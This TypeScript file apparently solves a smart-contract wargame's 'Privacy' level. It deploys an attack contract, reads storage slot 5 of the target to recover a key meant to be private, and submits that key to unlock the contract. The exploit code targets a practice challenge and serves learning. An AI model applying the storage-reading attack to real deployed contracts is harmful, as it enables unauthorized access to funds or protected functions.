import { PrivacyAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const PRIVACY_LEVEL_NAME = "Privacy"

export const privacyAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying PrivacyAttacker.');

            const contract = await ethereum.deployContract<PrivacyAttack>('PrivacyAttack');
            console.log('Attacker deployed at: ', await contract.getAddress(), ' Perfoming the attack');

            const key = await ethereum.getStorageValue(instanceAddress, '5');
            const attackTx = await contract.attack(instanceAddress, key);
            await attackTx.wait();
        }
    }
}